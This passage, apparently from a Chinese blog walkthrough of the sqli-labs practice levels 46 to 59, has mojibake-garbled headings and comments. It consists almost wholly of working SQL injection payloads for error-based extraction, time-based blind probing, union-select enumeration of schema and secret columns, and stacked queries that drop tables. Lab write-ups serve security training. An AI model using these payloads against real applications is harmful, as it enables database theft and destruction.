class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(&quot;!&quot;,database()),<span class="hljs-number">2</span>)#<br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(&quot;!&quot;,(<span class="hljs-keyword">SELECT</span> group_concat(table_name) <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">2</span>)#<br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(&quot;!&quot;,(<span class="hljs-keyword">SELECT</span> group_concat(c2olumn_name) <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">AND</span> table_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;emails&#x27;</span>)),<span class="hljs-number">2</span>)#<br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,(<span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,id,email_id) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> id,email_id <span class="hljs-keyword">FROM</span> emails)text LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)#<br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,(<span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,id,email_id) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> id,email_id <span class="hljs-keyword">FROM</span> emails)text LIMIT <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)#<br><br><br></code></pre></td></tr></table></figure><h4 id="Less-47-æŠ¥é”™æ³¨å…¥-â€˜-é¡µé¢ä¸è¿”å›å›æ˜¾"><a href="#Less-47-æŠ¥é”™æ³¨å…¥-â€˜-é¡µé¢ä¸è¿”å›å›æ˜¾" class="headerlink" title="Less-47-æŠ¥é”™æ³¨å…¥-â€˜-é¡µé¢ä¸è¿”å›å›æ˜¾"></a>Less-47-æŠ¥é”™æ³¨å…¥-â€˜-é¡µé¢ä¸è¿”å›å›æ˜¾</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND updatexml(1,concat(&quot;!&quot;,database()),2) --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?sort=1&#x27;</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(&quot;!&quot;,(<span class="hljs-keyword">SELECT</span> group_concat(table_name) <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">2</span>) <span class="hljs-comment">--+</span><br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND updatexml(1,concat(&quot;!&quot;,(SELECT group_concat(c2olumn_name) FROM information_schema.columns WHERE table_schema = &#x27;</span>security<span class="hljs-string">&#x27; AND table_name = &#x27;</span>emails<span class="hljs-string">&#x27;)),2) --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?sort=1&#x27;</span> <span class="hljs-keyword">AND</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,(<span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,id,email_id) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> id,email_id <span class="hljs-keyword">FROM</span> emails)text LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND updatexml(1,concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;,(SELECT concat_ws(&#x27;</span>:<span class="hljs-string">&#x27;,id,email_id) FROM (SELECT id,email_id FROM emails)text LIMIT 1,1)),1) --+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h4 id="Less-48-æ—¶é—´ç›²æ³¨-æ•°å­—å‹"><a href="#Less-48-æ—¶é—´ç›²æ³¨-æ•°å­—å‹" class="headerlink" title="Less-48-æ—¶é—´ç›²æ³¨-æ•°å­—å‹"></a>Less-48-æ—¶é—´ç›²æ³¨-æ•°å­—å‹</h4><p>ç»è¿‡æµ‹è¯•ï¼Œè¿™ä¸€å…³æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œé¡µé¢ä¸è¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œè¦ä½¿ç”¨æ—¶é—´ç›²æ³¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> IF(LENGTH(database())<span class="hljs-operator">=</span><span class="hljs-number">8</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> IF(<span class="hljs-keyword">LEFT</span>((<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> IF(<span class="hljs-keyword">LEFT</span>((<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">8</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-49-æ—¶é—´ç›²æ³¨-â€˜"><a href="#Less-49-æ—¶é—´ç›²æ³¨-â€˜" class="headerlink" title="Less-49-æ—¶é—´ç›²æ³¨-â€˜"></a>Less-49-æ—¶é—´ç›²æ³¨-â€˜</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LENGTH(database())=8,sleep(1),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?sort=1&#x27;</span> <span class="hljs-keyword">AND</span> IF(<span class="hljs-keyword">LEFT</span>((<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;s&#x27;</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AND IF(LEFT((SELECT database()), 8)=&#x27;</span>security<span class="hljs-string">&#x27;,sleep(1),1)--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-50-52"><a href="#Less-50-52" class="headerlink" title="Less-50,52"></a>Less-50,52</h4><p>è¾“å…¥æ­£å¸¸çš„å‚æ•°ï¼Œç½‘é¡µå›æ˜¾ç”¨æˆ·ååˆ—è¡¨ã€‚å¯¹ sort å‚æ•°ä½¿ç”¨å•å¼•å·é—­åˆï¼Œç½‘é¡µè¿”å›é”™è¯¯ä¿¡æ¯ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>å’Œ Less 46 ä¸€æ ·ä½¿ç”¨æŠ¥é”™æ³¨å…¥æˆ–æ—¶é—´æ³¨å…¥å°±å¯ä»¥å®Œæˆï¼Œæ­¤å¤„ç”¨äºæµ‹è¯•å †å æ³¨å…¥ã€‚ä½¿ç”¨å †å æŸ¥è¯¢å®Œæˆ Less 38 çš„æ ·ä¾‹ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">CREATE TABLE</span> WhiteMoon <span class="hljs-keyword">LIKE</span> users;<span class="hljs-comment">--+</span><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">INSERT INTO</span> WhiteMoon <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;<span class="hljs-comment">--+</span><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> WhiteMoon;<span class="hljs-comment">--+</span><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> WhiteMoon;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-51-53"><a href="#Less-51-53" class="headerlink" title="Less-51,53"></a>Less-51,53</h4><p>æ­¤å¤„å­˜åœ¨å•å¼•å·é—­åˆçš„å­—ç¬¦å‹æ³¨å…¥ã€‚</p><p> Less 47 ä¸€æ ·ä½¿ç”¨æŠ¥é”™æ³¨å…¥æˆ–æ—¶é—´æ³¨å…¥å°±å¯ä»¥å®Œæˆï¼Œæ­¤å¤„ç”¨äºæµ‹è¯•å †å æ³¨å…¥ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;CREATE TABLE WhiteMoon LIKE users;--+</span><br><span class="hljs-string">?sort=1&#x27;</span>;<span class="hljs-keyword">INSERT INTO</span> WhiteMoon <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users;<span class="hljs-comment">--+</span><br>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;DELETE FROM WhiteMoon;--+</span><br><span class="hljs-string">?sort=1&#x27;</span>;<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> WhiteMoon;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-54-è”åˆæŸ¥è¯¢æ³¨å…¥-åæ¬¡é™åˆ¶-â€˜"><a href="#Less-54-è”åˆæŸ¥è¯¢æ³¨å…¥-åæ¬¡é™åˆ¶-â€˜" class="headerlink" title="Less-54-è”åˆæŸ¥è¯¢æ³¨å…¥(åæ¬¡é™åˆ¶)-â€˜"></a>Less-54-è”åˆæŸ¥è¯¢æ³¨å…¥(åæ¬¡é™åˆ¶)-â€˜</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">#åˆ¤æ–­å¾—çŸ¥ä¸ºå­—ç¬¦å‹æ³¨å…¥:<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=1 --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#åˆ¤æ–­å­—æ®µæ•°</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>#çˆ†å½“å‰æ•°æ®åº“å’Œç”¨æˆ·å<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,user(),database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#çˆ†å½“å‰æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨</span><br><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-comment">--+</span><br><br>#è¿™é‡Œçš„è¡¨æ¯ä¸€æ¬¡éƒ½æ˜¯éšæœºç»™å‡ºçš„<span class="hljs-operator">/</span>dtbzuzk1tk<span class="hljs-operator">/</span><br><br>#çˆ†å­—æ®µ<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>dtbzuzk1tk<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#å­—æ®µä¹Ÿæ˜¯éšæœº/secret_S7T1/</span><br><span class="hljs-string"></span><br><span class="hljs-string">#çˆ†æ•°æ®ï¼Œå–/secret_****/æ®µä¸ºè¿‡å…³æ•°æ®</span><br><span class="hljs-string">?id=0&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-number">0x7e</span>,sessid,<span class="hljs-number">0x7e</span>,secret_S7T1) <span class="hljs-keyword">from</span> dtbzuzk1tk <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-55-è”åˆæŸ¥è¯¢æ³¨å…¥-åå››æ¬¡é™åˆ¶"><a href="#Less-55-è”åˆæŸ¥è¯¢æ³¨å…¥-åå››æ¬¡é™åˆ¶" class="headerlink" title="Less-55-è”åˆæŸ¥è¯¢æ³¨å…¥(åå››æ¬¡é™åˆ¶)-)"></a>Less-55-è”åˆæŸ¥è¯¢æ³¨å…¥(åå››æ¬¡é™åˆ¶)-)</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">#åˆ¤æ–­å¾—çŸ¥ä¸ºå­—ç¬¦å‹æ³¨å…¥:<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br><br>#åˆ¤æ–­å­—æ®µæ•°<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>#çˆ†å½“å‰æ•°æ®åº“å’Œç”¨æˆ·å<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),database() <span class="hljs-comment">--+</span><br><br>#çˆ†å½“å‰æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-comment">--+</span><br><br>#è¿™é‡Œçš„è¡¨æ¯ä¸€æ¬¡éƒ½æ˜¯éšæœºç»™å‡ºçš„<span class="hljs-operator">/</span>k4slr3jkz6<span class="hljs-operator">/</span><br><br>#çˆ†å­—æ®µ<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;k4slr3jkz6&#x27;</span> <span class="hljs-comment">--+</span><br><br>#å­—æ®µä¹Ÿæ˜¯éšæœº<span class="hljs-operator">/</span>secret_OBJS<span class="hljs-operator">/</span><br><br>#çˆ†æ•°æ®ï¼Œå–<span class="hljs-operator">/</span>secret_<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">/</span>æ®µä¸ºè¿‡å…³æ•°æ®<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-number">0x7e</span>,sessid,<span class="hljs-number">0x7e</span>,secret_OBJS) <span class="hljs-keyword">from</span> k4slr3jkz6 <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-56-è”åˆæŸ¥è¯¢æ³¨å…¥-åå››æ¬¡é™åˆ¶-â€˜ï¼‰"><a href="#Less-56-è”åˆæŸ¥è¯¢æ³¨å…¥-åå››æ¬¡é™åˆ¶-â€˜ï¼‰" class="headerlink" title="Less-56-è”åˆæŸ¥è¯¢æ³¨å…¥(åå››æ¬¡é™åˆ¶)-â€˜ï¼‰"></a>Less-56-è”åˆæŸ¥è¯¢æ³¨å…¥(åå››æ¬¡é™åˆ¶)-â€˜ï¼‰</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">#åˆ¤æ–­å¾—çŸ¥ä¸ºå­—ç¬¦å‹æ³¨å…¥:<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and 1=1 --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#åˆ¤æ–­å­—æ®µæ•°</span><br><span class="hljs-string">?id=1&#x27;</span>) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>#çˆ†å½“å‰æ•°æ®åº“å’Œç”¨æˆ·å<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;) union select 1,user(),database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#çˆ†å½“å‰æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨</span><br><span class="hljs-string">?id=0&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-comment">--+</span><br><br>#è¿™é‡Œçš„è¡¨æ¯ä¸€æ¬¡éƒ½æ˜¯éšæœºç»™å‡ºçš„<span class="hljs-operator">/</span>k4slr3jkz6<span class="hljs-operator">/</span><br><br>#çˆ†å­—æ®µ<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>k4slr3jkz6<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#å­—æ®µä¹Ÿæ˜¯éšæœº/secret_OBJS/</span><br><span class="hljs-string"></span><br><span class="hljs-string">#çˆ†æ•°æ®ï¼Œå–/secret_****/æ®µä¸ºè¿‡å…³æ•°æ®</span><br><span class="hljs-string">?id=0&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-number">0x7e</span>,sessid,<span class="hljs-number">0x7e</span>,secret_OBJS) <span class="hljs-keyword">from</span> k4slr3jkz6 <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-57-è”åˆæŸ¥è¯¢æ³¨å…¥-åå››æ¬¡é™åˆ¶-â€œ"><a href="#Less-57-è”åˆæŸ¥è¯¢æ³¨å…¥-åå››æ¬¡é™åˆ¶-â€œ" class="headerlink" title="Less-57-è”åˆæŸ¥è¯¢æ³¨å…¥(åå››æ¬¡é™åˆ¶)-â€œ"></a>Less-57-è”åˆæŸ¥è¯¢æ³¨å…¥(åå››æ¬¡é™åˆ¶)-â€œ</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">#åˆ¤æ–­å¾—çŸ¥ä¸ºå­—ç¬¦å‹æ³¨å…¥:<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and 1=1 --+<br><br>#åˆ¤æ–­å­—æ®µæ•°<br>?id=1&quot; <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br>#çˆ†å½“å‰æ•°æ®åº“å’Œç”¨æˆ·å<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot; union select 1,user(),database() --+<br><br>#çˆ†å½“å‰æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨<br>?id=0&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-comment">--+</span><br><br>#è¿™é‡Œçš„è¡¨æ¯ä¸€æ¬¡éƒ½æ˜¯éšæœºç»™å‡ºçš„<span class="hljs-operator">/</span><span class="hljs-number">4</span>wlhf91tdn<span class="hljs-operator">/</span><br><br>#çˆ†å­—æ®µ<br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;4wlhf91tdn&#x27; --+<br><br>#å­—æ®µä¹Ÿæ˜¯éšæœº/secret_WCBG/<br><br>#çˆ†æ•°æ®ï¼Œå–/secret_****/æ®µä¸ºè¿‡å…³æ•°æ®<br>?id=0&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-number">0x7e</span>,sessid,<span class="hljs-number">0x7e</span>,secret_WCBG) <span class="hljs-keyword">from</span> <span class="hljs-number">4</span>wlhf91tdn <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="Less-58-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€˜"><a href="#Less-58-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€˜" class="headerlink" title="Less-58-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€˜"></a>Less-58-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-â€˜</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">#è·å¾—è¡¨åï¼šä¹‹å‰å·²ç»çŸ¥é“æ•°æ®åº“çš„åå­—æ˜¯challenges<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>CHALLENGES<span class="hljs-string">&#x27;) ),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">#è·å–å­—æ®µï¼š</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> Information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rropvsv2k3&#x27;</span> )),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br> #è·å–å­—æ®µçš„å€¼ï¼š<br> ?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(secret_NP44) from challenges.rropvsv2k3 )),1)--+</span><br><span class="hljs-string"> </span><br><span class="hljs-string"> mNPc5dq8hrv47LdDXgFFjiJe</span><br></code></pre></td></tr></table></figure><h4 id="Less-59-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-æ•°å­—å‹"><a href="#Less-59-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-æ•°å­—å‹" class="headerlink" title="Less-59-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-æ•°å­—å‹"></a>Less-59-æŠ¥é”™æ³¨å…¥ï¼ˆäº”æ¬¡é™åˆ¶ï¼‰-æ•°å­—å‹</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">#è·å¾—è¡¨åï¼š<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;CHALLENGES&#x27;</span>) ),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>#è·å–å­—æ®µï¼š<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> Information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;jzhybgbqrz&#x27;</span> )),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br> #è·å–å­—æ®µçš„å€¼ï¼š<br> ?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span 